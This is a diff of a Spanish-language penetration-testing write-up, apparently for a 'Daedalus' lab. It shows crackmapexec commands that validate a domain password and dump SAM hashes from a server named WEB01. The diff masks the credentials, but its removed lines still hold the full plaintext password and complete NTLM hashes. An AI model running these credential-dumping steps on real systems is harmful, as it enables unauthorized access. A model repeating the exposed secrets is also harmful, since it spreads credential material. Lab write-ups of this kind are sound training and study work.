@@ -596,9 +596,9 @@ Para facilitar futuras acciones y ataques, añadimos las direcciones IP y sus re
 Posteriormente, confirmamos que las credenciales obtenidas en la tarea hacia el controlador de dominio (DC1) son válidas.
 
 ```bash
-❯ crackmapexec smb dc1.daedalus.local -u billing_user -p D43d4lusB1ll1ngB055
+❯ crackmapexec smb dc1.daedalus.local -u billing_user -p D43d4******ngB055
 SMB         daedalus.local  445    DC1              [*] Windows 10.0 Build 17763 x64 (name:DC1) (domain:daedalus.local) (signing:True) (SMBv1:False)  
-SMB         daedalus.local  445    DC1              [+] daedalus.local\billing_user:D43d4lusB1ll1ngB055
+SMB         daedalus.local  445    DC1              [+] daedalus.local\billing_user:D43d********1ngB055
 ```
 
 Finalmente, al examinar los administradores locales en WEB01, descubrimos que el usuario "billing_user" es miembro del grupo de administradores a nivel de dominio. Esta cuenta de usuario tiene la misma contraseña que se obtuvo anteriormente.
@@ -621,19 +621,19 @@ The command completed successfully.
 Al utilizar CrackMapExec nuevamente, pero esta vez hacia WEB01, se confirmó que se tiene acceso con privilegios máximos ("Pwn3d!"). Por lo tanto, se puede proceder a realizar el volcado de la SAM (Security Accounts Manager).
 
 ```bash
-❯ crackmapexec smb web01.daedalus.local -u billing_user -p D43d4lusB1ll1ngB055
+❯ crackmapexec smb web01.daedalus.local -u billing_user -p D43d4******ngB055
 SMB         web01.daedalus.local 445    WEB01            [*] Windows Server 2019 Standard 17763 x64 (name:WEB01) (domain:daedalus.local) (signing:False) (SMBv1:True)  
-SMB         web01.daedalus.local 445    WEB01            [+] daedalus.local\billing_user:D43d4lusB1ll1ngB055 (Pwn3d!)
+SMB         web01.daedalus.local 445    WEB01            [+] daedalus.local\billing_user:D43d4******ngB055 (Pwn3d!)
 
-❯ crackmapexec smb web01.daedalus.local -u billing_user -p D43d4lusB1ll1ngB055 --sam
+❯ crackmapexec smb web01.daedalus.local -u billing_user -p D43d4******ngB055 --sam
 SMB         web01.daedalus.local 445    WEB01            [*] Windows Server 2019 Standard 17763 x64 (name:WEB01) (domain:daedalus.local) (signing:False) (SMBv1:True)  
-SMB         web01.daedalus.local 445    WEB01            [+] daedalus.local\billing_user:D43d4lusB1ll1ngB055 (Pwn3d!)
+SMB         web01.daedalus.local 445    WEB01            [+] daedalus.local\billing_user:D43d4******ngB055 (Pwn3d!)
 SMB         web01.daedalus.local 445    WEB01            [*] Dumping SAM hashes
-SMB         web01.daedalus.local 445    WEB01            Administrator:500:aad3b435b51404eeaad3b435b51404ee:568c606ed9511b9a10d7d026322e8521:::
-SMB         web01.daedalus.local 445    WEB01            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-SMB         web01.daedalus.local 445    WEB01            DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-SMB         web01.daedalus.local 445    WEB01            WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:fb3ada79aa86ea85ffc477a12c27bea2:::
-SMB         web01.daedalus.local 445    WEB01            svc_dev:1003:aad3b435b51404eeaad3b435b51404ee:c052d2a19169ce31d0b80ce67114a74e:::
+SMB         web01.daedalus.local 445    WEB01            Administrator:500:aad3********************9511b9a10d7d026322e8521:::
+SMB         web01.daedalus.local 445    WEB01            Guest:501:aad3b435b514**********************fe0d16ae931b73c59d7e0c089c0:::
+SMB         web01.daedalus.local 445    WEB01            DefaultAccount:503:aa****************************e0c089c0:::
+SMB         web01.daedalus.local 445    WEB01            WDAGUtilityAccount:504:aad3b****************************5ffc477a12c27bea2:::
+SMB         web01.daedalus.local 445    WEB01            svc_dev:1003:aad3b435b*****************************888169ce31d0b80ce67114a74e:::
 SMB         web01.daedalus.local 445    WEB01            [+] Added 5 SAM hashes to the database
 ```
 
